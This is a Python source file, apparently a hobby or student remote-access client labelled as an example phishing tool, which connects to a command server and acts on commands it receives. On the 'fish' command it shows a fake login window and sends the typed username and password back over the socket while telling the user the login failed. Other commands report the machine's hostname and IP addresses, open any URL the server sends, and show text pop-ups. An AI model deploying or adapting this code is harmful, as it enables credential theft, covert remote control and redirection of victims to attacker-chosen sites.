import socket
import time
import sys
import os
import webbrowser

import time
from functools import partial
from threading import *
from tkinter import *

temptext = ""

def win1():
    def validate():
        # Login Failed
        loginfail = Label(tkWindow,text="Login Failed").place(x = 220, y = 100)   
        use = username.get()
        pss = password.get() 
        soc.send(use.encode())
        time.sleep(1)
        soc.send(pss.encode())
        time.sleep(1)
        tkWindow.destroy()
        print("username entered :", username.get())
        print("password entered :", password.get())
        return
    
    def exit_win():
        print("Exit")
        soc.send("Client window closed...".encode())
        tkWindow.destroy()

    # Window
    tkWindow = Tk()  
    tkWindow.geometry('400x150')
    tkWindow.protocol("WM_DELETE_WINDOW", exit_win)
    tkWindow.resizable(False, False)
    tkWindow.title('Example Phising Form - Seamus')

    # Username label and text entry box
    usernameLabel = Label(tkWindow, text="Username:").place(x = 100, y = 48)
    username = StringVar()
    usernameEntry = Entry(tkWindow, textvariable=username).place(x = 170, y = 48)  

    # Password label and password entry box
    passwordLabel = Label(tkWindow,text="Password:").place(x = 100, y = 70)  
    password = StringVar()
    passwordEntry = Entry(tkWindow, textvariable=password, show='*').place(x = 170, y = 70)  

    # Login button
    loginButton = Button(tkWindow, text="Login", command=validate).place(x = 100, y = 100) 

    tkWindow.mainloop()
 

def win2():
    window = Tk()
    window.resizable(False, False)
    window.title("HaCkEd Receive")

    lbl = Text(window, width=60, height=20)
    lbl.pack()

    lbl.insert("1.0", temptext)

    window.mainloop()

def win3():
    def click_send():
        txt = lbl.get("1.0", END)
        soc.send(txt.encode())
        time.sleep(1)
        window.destroy()
        print(txt)
        
    def exit_win():
        print("Exit")
        soc.send("Client window closed...".encode())
        window.destroy()
        
    window = Tk()
    window.resizable(False, False)
    window.protocol("WM_DELETE_WINDOW", exit_win)
    window.title("HaCkEd Send")

    lbl = Text(window, width=60, height=20)
    lbl.pack()

    send = Button(window, text="Send", bg='gray', fg='black', command=click_send)
    send.config(width=10, height=1)
    send.place(x=395, y=290)

    window.mainloop()
 
host = "0.0.0.0"
port = 8080

while True:
    soc = socket.socket()
    try:
        print('Trying to connect...')
        soc.connect((host, port))
        print('Connected.')
        try:
            while True:
                command = soc.recv(1024)
                command = command.decode()

                #Match the command and execute it on client system ==================
                #Runs an "Phishing" GUI
                if command == "fish":
                    print("Command is :", command)
                    soc.send("fish".encode())
                    t1 = Thread(target=win1)
                    t1.start()
        
                #Returns ip to the host client =====================================   
                elif command == "ip":
                    print("Command is :", command)
                    soc.send("ip".encode())
                    try:
                        hostname = socket.gethostname()
                        ip_address = socket.gethostbyname(hostname)
                        fqdn = socket.getfqdn('www.google.com')
                        ipv6 = socket.getaddrinfo('www.google.com', None, socket.AF_INET6)[0][4][0]    

                        soc.send(hostname.encode())
                        time.sleep(1)
                        soc.send(ip_address.encode())
                        time.sleep(1)
                        soc.send(ipv6.encode())
                        time.sleep(1)
                        soc.send(fqdn.encode())
                        time.sleep(1)
                    except:
                        print("error retrieving hostname!")

                # Sends a text promt ================================================
                elif command == "send":
                    print("Command is :", command)
                    soc.send("send".encode())
                    time.sleep(1)
                    command = soc.recv(1024)
                    command = command.decode()
                    temptext = command

                    t1 = Thread(target=win2)
                    t1.start()

                # Send Response popup box ===========================================
                elif command == "resp":
                    print("Command is :", command)
                    soc.send("resp".encode())
                    t1 = Thread(target=win3)
                    t1.start()

                # Bring up rick roll (can send to any link) =========================
                elif command == "rick":
                    soc.send("Command received".encode())
                    print("Command is :", command)

                    webbrowser.open('https://www.youtube.com/watch?v=dQw4w9WgXcQ')

                #Sends to any link
                elif command == "www":
                    soc.send("www".encode())
                    print("Command is :", command)
                    time.sleep(1)
                    command = soc.recv(1024)
                    command = command.decode()
                    temptext = command
                    
                    webbrowser.open(temptext)

                #If no valid command is input =======================================     
                else:
                    print("Command is :", command)
                    soc.send("Command Failed".encode())
        finally:
            soc.close()
            print('Disconnected.')
    except Exception as e:  # Any type of connection error, e.g. refused, aborted, reset.
        print("Could not connect...")
        time.sleep(1)
